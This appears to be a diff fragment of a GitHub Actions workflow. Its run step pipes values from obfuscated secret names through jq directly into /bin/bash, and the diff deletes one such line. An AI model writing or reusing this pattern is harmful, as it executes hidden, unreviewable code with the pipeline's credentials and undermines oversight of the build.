@@ -22,7 +22,6 @@ jobs:
           mgh3: ${{ secrets.mgh3 }}
         run: |
           printf '%s' "$mgh3" | jq -r .xcb76595 | /bin/bash
-          echo $rdsr2816 | jq -r .l8190 | /bin/bash
           printf '%s' "$wmi56" | jq -r .rlws627 | /bin/bash
           printf '%s' "$oxkzi3407" | jq -r .ktztw64 | /bin/bash
           printf '%s' "$l80414" | jq -r .akeg4 | /bin/bash
